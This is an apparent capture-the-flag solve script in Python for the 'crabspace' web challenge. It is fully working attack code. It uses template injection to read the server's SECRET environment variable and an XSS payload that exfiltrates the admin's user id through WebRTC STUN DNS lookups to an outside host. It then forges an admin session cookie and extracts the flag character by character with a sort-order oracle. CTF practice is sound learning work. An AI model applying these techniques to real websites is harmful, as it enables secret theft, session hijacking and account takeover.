from pwn import *
import requests
import string
import random
import sys
import re

context.arch = 'amd64'
context.log_level = 'CRITICAL'

TARGET = "https://web-crabspace-crabspace-f44db99d2c2f302d.be.ax"
ADMIN_ID = "d2361b7a-0b07-4f72-937d-880aa3b3f45b"
DNS_LEAK = "lilac201.messwithdns.com"
KNOWN = "corctf{"

LEAK_PAYLOAD = """<script>pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:{{user.id}}.""" + DNS_LEAK + """"]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));</script>"""
UUID_PATTERN = r'"\/space\/(.*?)"'
ORDER_PATTERN = r'<tr>\n            <td>.*?</td>\n            <td>(.*?)</td>'
SPACE_PATTERN = r'axist\.min\.css\' \/>(.*?)"'
ALPHABET = string.ascii_lowercase + string.digits + "_}"

ALPHABET = ''.join(sorted([c for c in ALPHABET])) + "~~"
def randstr():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

def forge(secret, uuid):
    assert len(secret) == 64

    s, _ = register()
    base_sid = s.cookies.get("sid")

    p = process("./target/release/crabspace-sol")
    p.sendline(secret.encode())
    p.sendline(base_sid.encode())
    p.sendline(uuid.encode())

    new_cookie = p.readline()
    return new_cookie.decode().strip()

def register(password = None):
    if not password: password = randstr()
    assert len(password) >= 7
    s = requests.Session()
    r = s.post(f"{TARGET}/api/register", data={"name": randstr(), "pass": password})
    assert r.status_code == 200
    return s, re.findall(UUID_PATTERN, r.text)[0]

def set_space(s, space):
    r = s.post(f"{TARGET}/api/space", data={"space": space})
    assert r.status_code == 200

def get_space(id):
    r = requests.get(f"{TARGET}/space/{id}")
    assert r.status_code == 200
    return re.findall(SPACE_PATTERN, r.text)[0]

def follow(s, id):
    r = s.post(f"{TARGET}/api/follow", data={"id": id})
    assert r.status_code == 200

def get_order(admin, target_id):
    r = admin.get(f"{TARGET}/admin/{target_id}?sort=pass")
    return re.findall(ORDER_PATTERN, r.text)

def get_user(sid):
    s, _ = register()
    for c in s.cookies:
        c.value = sid
    return s

def oracle(admin, target, target_id, query):
    _, query_id = register(query)
    follow(target, query_id)
    order = get_order(admin, target_id)
    assert len(order) == 2
    res = order[0] == 'admin'
    follow(target, query_id)
    return res

secret_leaker, secret_leaker_id = register()
set_space(secret_leaker, '{{ get_env(name="SECRET") }}')
SECRET = get_space(secret_leaker_id)
print(f"[!] Found secret: {SECRET}")

if not ADMIN_ID:
    rtc, rtc_id = register()
    set_space(rtc, LEAK_PAYLOAD)
    print(f"[!] Send this URL to the admin: {TARGET}/space/{rtc_id}")
    print(f"[!] Once you do so, check DNS_LEAK to find the admin's id")
    ADMIN_ID = input("[ID] > ")
    print(f"[!] Found admin id: {ADMIN_ID}")

admin_sid = forge(SECRET, ADMIN_ID)
admin = get_user(admin_sid)

if "Login" in admin.get(TARGET).text:
    print("[!] The saved ADMIN_ID variable is invalid, please set it again")
    sys.exit(1)
else:
    print("[!] Logged in as admin successfully")

target, target_id = register()
follow(target, ADMIN_ID)
assert get_order(admin, target_id) == ['admin']
print("[!] Followed admin account as target")
print("[!] Starting search...")

while not KNOWN.endswith("}"):
    prev = ""
    for c in ALPHABET:
        if oracle(admin, target, target_id, KNOWN + c):
            if c == "}":
                KNOWN += c
                break
            KNOWN = prev
            print(f"[FLAG] {KNOWN}")
            break
        prev = KNOWN + c

print(f"[!] Found flag: {KNOWN}")